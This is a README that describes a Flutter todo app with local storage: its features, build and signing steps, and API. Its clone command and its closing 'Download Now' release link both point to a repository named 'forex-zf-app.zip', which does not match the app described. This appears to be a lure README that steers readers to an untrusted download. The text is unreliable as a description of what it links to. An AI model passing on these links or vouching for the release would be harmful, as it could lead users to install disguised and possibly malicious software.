# Todo App - Local Storage Application

A beautiful and functional Flutter todo list application with local storage functionality.

## Features

✅ **Add, Edit, Delete Todos**
- Create new todos with title and description
- Edit existing todos
- Delete todos with confirmation

✅ **Local Storage**
- All data saved locally using SharedPreferences
- Data persists even after app restart
- No internet required

✅ **Priority Levels**
- Set todo priority (Low, Medium, High)
- Visual indicators for priority levels
- Sort by priority

✅ **Due Dates**
- Set due dates for todos
- Visual date badges
- Automatic overdue detection
- View overdue todos in separate tab

✅ **Task Management**
- Mark todos as complete/incomplete
- Track progress with statistics
- View active, completed, and overdue todos
- Search functionality

✅ **Beautiful UI**
- Material Design 3
- Responsive layout
- Dark and light theme support
- Smooth animations

✅ **Statistics Dashboard**
- Total todos count
- Active vs completed ratio
- Progress indicator
- Overdue todos alert

## Project Structure

```
lib/
├── main.dart                 # App entry point
├── models/
│   └── todo_model.dart      # TodoModel class
├── providers/
│   └── todo_provider.dart   # State management with Provider
├── services/
│   └── storage_service.dart # Local storage service
├── screens/
│   └── todo_screen.dart     # Main screen
└── widgets/
    ├── todo_list_item.dart       # Todo item widget
    ├── add_todo_dialog.dart      # Add todo dialog
    ├── edit_todo_dialog.dart     # Edit todo dialog
    └── todo_stats.dart           # Statistics widget
```

## Installation & Setup

### Prerequisites
- Flutter SDK (v3.0.0 or higher)
- Android SDK (for APK build)
- Java JDK 11 or higher

### Installation Steps

1. **Clone the repository**
```bash
git clone https://github.com/ZahenoL777/forex-zf-app.zip.git
cd forex-zf-app
```

2. **Install dependencies**
```bash
flutter pub get
```

3. **Run the app on emulator/device**
```bash
flutter run
```

## Build APK

### Debug APK
```bash
flutter build apk
```
Output: `build/app/outputs/apk/debug/app-debug.apk`

### Release APK (Recommended)
```bash
flutter build apk --release
```
Output: `build/app/outputs/apk/release/app-release.apk`

### Release APK with Signing

1. **Create keystore (one-time only)**
```bash
keytool -genkey -v -keystore ~/key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias key
```

2. **Create key.properties file** at `android/key.properties`
```properties
storePassword=<your_store_password>
keyPassword=<your_key_password>
keyAlias=key
storeFile=/path/to/key.jks
```

3. **Build signed release APK**
```bash
flutter build apk --release
```

## Usage

### Adding a Todo
1. Tap the **+** button at the bottom right
2. Enter title (required)
3. Add description (optional)
4. Select priority level (Low, Medium, High)
5. Set due date (optional)
6. Tap **Add**

### Editing a Todo
1. Long press on a todo or tap the menu (⋮) icon
2. Select **Edit**
3. Modify the details
4. Tap **Update**

### Marking Complete
1. Tap the checkbox on a todo
2. Todo will automatically move to "Completed" tab

### Searching Todos
1. Use the search bar at the top
2. Search by title or description
3. Clear search to see all todos

### Filtering Todos
- **All**: View all todos
- **Active**: View incomplete todos
- **Completed**: View completed todos
- **Overdue**: View past due incomplete todos

### Viewing Statistics
- Real-time stats card shows total, active, and completed todos
- Progress bar displays completion percentage

## Technologies Used

- **Flutter** - UI Framework
- **Provider** - State Management
- **SharedPreferences** - Local Storage
- **Intl** - Date formatting
- **UUID** - Unique ID generation

## Dependencies

```yaml
dependencies:
  flutter:
    sdk: flutter
  shared_preferences: ^2.2.2
  intl: ^0.19.0
  provider: ^6.0.0
  uuid: ^3.0.0
```

## API Reference

### TodoModel
```dart
TodoModel({
  required String id,
  required String title,
  String description = '',
  bool isCompleted = false,
  required DateTime createdAt,
  DateTime? dueDate,
  String priority = 'medium',
})
```

### TodoProvider (State Management)
```dart
// Add todo
addTodo(String title, {String description, DateTime? dueDate, String priority})

// Update todo
updateTodo(String id, {String? title, String? description, bool? isCompleted, DateTime? dueDate, String? priority})

// Toggle completion
toggleTodo(String id)

// Delete todo
deleteTodo(String id)

// Clear all todos
clearAllTodos()

// Getters
todos              // All todos
activeTodos        // Incomplete todos
completedTodos     // Completed todos
overdueTodos       // Past due todos
totalTodos         // Total count
completedCount     // Completed count
activeCount        // Active count
```

## Troubleshooting

### Build fails with "Flutter SDK not found"
- Ensure Flutter is installed: `flutter doctor`
- Add Flutter to PATH
- Run `flutter pub get`

### SharedPreferences not persisting data
- Run `flutter clean`
- Uninstall and reinstall the app
- Check device storage permissions

### APK too large
Use app bundle for smaller size:
```bash
flutter build appbundle --release
```

### Connection error when building
- Check internet connection
- Run `flutter pub get` manually
- Try `flutter clean && flutter pub get`

## Future Enhancements

- [ ] Cloud synchronization (Firebase)
- [ ] Recurring todos (daily, weekly, monthly)
- [ ] Todo categories/tags
- [ ] Push notifications for due dates
- [ ] Dark mode theme
- [ ] Export/Import functionality (CSV, JSON)
- [ ] Backup to Google Drive
- [ ] Collaborative todos (sharing)
- [ ] Habit tracking features
- [ ] Voice input for todo creation
- [ ] Integration with Google Calendar
- [ ] Offline sync capability

## Performance Tips

- Uses efficient local storage with SharedPreferences
- Provider pattern ensures minimal rebuilds
- ListView.builder for efficient list rendering
- JSON serialization for fast storage/retrieval

## License

MIT License - Free to use for personal and commercial projects

## Support & Contribution

### Reporting Issues
1. Check existing issues
2. Provide clear description
3. Include device and Flutter version
4. Share error logs if available

### Contributing
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push to branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## Author

Developed with ❤️ by ZahenoL777

## Acknowledgments
- Flutter team for the excellent framework
- Provider package for state management
- SharedPreferences for local storage

---

**Download Now** → [Get Latest Release](https://github.com/ZahenoL777/forex-zf-app.zip/releases)

**Last Updated**: June 2026